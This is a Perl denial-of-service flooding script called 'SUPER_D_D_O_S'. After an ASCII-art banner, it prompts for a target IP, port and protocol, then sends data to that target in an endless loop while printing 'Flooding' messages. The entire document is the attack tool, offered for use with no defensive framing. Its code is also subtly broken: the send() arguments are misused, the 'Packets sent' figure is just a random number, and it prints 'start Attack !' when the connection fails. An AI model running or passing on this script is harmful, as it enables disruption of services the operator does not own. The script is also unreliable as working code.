#!/usr/bin/perl
use IO::Socket::INET;
use IO::Socket::SSL;
use Getopt::Long;
use Config;




system("clear || cls");
#Script Banner================================================================
print q{ 
                          .-"       "-.
                         /            \
                        |              |
                        |,  .-.  .-.  ,|
                        | )(__/  \__)( |
                        |/     /\     \|
              (@_       (_     ^^     _)
         _     ) \_______\__|IIIIII|__/__________________________
        (_)@8@8{}<________|-\IIIIII/-|_SUPER_D_D_O_S_>
               )_/        \          /
              (@           `--------` Welcome!

              };
print "\033[1;37m[---] \033[1;33m by:> SEH\n";
print "\033[1;37m              [---] \033[1;33m          Version:> 2.0 \n";
print "\033[1;37m              [---] \033[1;33m Super Eagle/ \n";
print "\033[1;37m \033[1;31m \n";


# INPUT TARGET INFO ==============================================
print "\n=================================================================";
print "\n Enter TargetIP: "; # Set Target IP
chop ($host = <stdin>);
print "===================================================================";
print "\n Enter Port: "; # Set Port
chop ($port = <stdin>);
print "===================================================================";
print "\n Enter Protockol (TCP or UDP) :"; # Set Protockol
chop ($proto = <stdin>);
system("clear || cls");
print "\n[*]Attack Has Been Start On [$host:$port] proto => [$proto].......\n\n";
sleep 3;

{
$sock = IO::Socket::INET->new (
	PeerAddr => $host,
	PeerPort => $port,
	Proto => "$proto" ) || die "\n start Attack !";


}
packets:
while (1) {
$size = rand() * 8921873 * 99919988;
print ("  Packets sent: $size\n");
send($sock, 999999999999999999999999999, $size); 
packets2:
$size = rand() * 8921873 * 99919988 * 2;
print "Flooding:";
send($sock, 999999999999999999999999999, $size);
packet3:
$size = rand() * 8921873 * 99919988 * 2 + 99919988;
print " (=>$host:$port~$proto<=)";
send($sock, $size, $size); # Attack start################

}




